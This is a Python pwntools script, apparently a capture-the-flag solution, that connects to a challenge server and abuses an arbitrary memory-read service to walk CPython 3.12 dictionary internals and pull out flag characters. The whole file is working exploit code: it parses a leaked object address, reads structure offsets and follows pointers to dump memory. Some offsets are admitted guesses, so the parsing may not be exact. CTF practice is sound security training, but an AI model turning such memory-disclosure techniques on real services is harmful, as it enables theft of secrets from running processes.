from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Python 3.12 Dict Structure Analysis ===")

reads_used = 0
max_reads = 45

# Step 1: Read PyDictObject structure
print("Reading PyDictObject...")
dict_data = []
for offset in [0x00, 0x08, 0x10, 0x18, 0x20, 0x28]:
    data = read_memory(dict_obj_addr + offset)
    reads_used += 1
    if data:
        val = u64(data)
        dict_data.append((offset, val))
        print(f"  +{offset:#04x}: {val:#018x}")

# Extract ma_keys pointer (should be at offset 0x20)
ma_keys_ptr = None
for offset, val in dict_data:
    if offset == 0x20:  # ma_keys offset
        ma_keys_ptr = val
        break

if not ma_keys_ptr or ma_keys_ptr < 0x1000:
    print("Could not find valid ma_keys pointer")
    io.close()
    exit(1)

print(f"\nma_keys pointer: {ma_keys_ptr:#x}")

# Step 2: Read PyDictKeysObject structure  
print("Reading PyDictKeysObject...")
keys_data = []
for offset in [0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48]:  # Key fields
    data = read_memory(ma_keys_ptr + offset)
    reads_used += 1
    if data:
        val = u64(data)
        keys_data.append((offset, val))
        print(f"  +{offset:#04x}: {val:#018x} ({val})")

# Extract important values
dk_nentries = None
dk_log2_size = None
for offset, val in keys_data:
    if offset == 0x48:  # dk_nentries
        dk_nentries = val
    elif offset == 0x20:  # dk_log2_size
        dk_log2_size = val

if dk_nentries is None:
    print("Could not find dk_nentries")
    io.close()
    exit(1)

print(f"\nDict has {dk_nentries} entries")

# Step 3: Calculate dk_entries location
# dk_entries comes after dk_indices array
# Index array size depends on dict size and index bytes
dict_size = 1 << (dk_log2_size if dk_log2_size else 3)
print(f"Dict size: {dict_size}")

# For small dicts, indices are typically 1 byte each
# dk_entries starts at approximately ma_keys + 0x50 + dict_size
indices_size = dict_size  # Assume 1 byte indices for now
dk_entries_addr = ma_keys_ptr + 0x50 + indices_size
print(f"Estimated dk_entries address: {dk_entries_addr:#x}")

# Step 4: Read dictionary entries
print(f"\nReading {min(dk_nentries, 10)} dictionary entries...")
flag_chars = {}

for i in range(min(dk_nentries, 10)):  # Limit to avoid using too many reads
    if reads_used >= max_reads - 5:
        break
        
    # Each PyDictKeyEntry is 24 bytes (3 * 8-byte pointers)
    entry_addr = dk_entries_addr + i * 24
    
    print(f"\nEntry {i} at {entry_addr:#x}:")
    
    # Read the entry (me_hash, me_key, me_value)
    for j, field in enumerate(['me_hash', 'me_key', 'me_value']):
        field_addr = entry_addr + j * 8
        data = read_memory(field_addr)
        reads_used += 1
        
        if data:
            val = u64(data)
            print(f"  {field}: {val:#x}")
            
            # For me_key and me_value, try to read the pointed-to objects
            if field in ['me_key', 'me_value'] and val > 0x1000 and reads_used < max_reads - 2:
                obj_data = read_memory(val)
                reads_used += 1
                if obj_data:
                    # Try to extract string/integer data
                    chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in obj_data)
                    print(f"    -> obj data: {obj_data.hex()} = '{chars}'")
                    
                    # If this is me_value and looks like a single character
                    if field == 'me_value':
                        clean_chars = ''.join(chr(b) for b in obj_data if 32 <= b <= 126)
                        if len(clean_chars) == 1:
                            # We need the corresponding key to know the index
                            # For now, just collect the character
                            flag_chars[i] = clean_chars
                            print(f"    *** Found flag char: '{clean_chars}' ***")

print(f"\n=== Results (used {reads_used}/{max_reads} reads) ===")
if flag_chars:
    print("Flag characters found:")
    for idx, char in flag_chars.items():
        print(f"  Entry {idx}: '{char}'")
    
    # Try to reconstruct
    reconstruction = ''.join(flag_chars.get(i, '?') for i in range(len(flag_chars)))
    print(f"Partial reconstruction: {reconstruction}")
else:
    print("No flag characters extracted. May need to adjust entry parsing.")

io.close()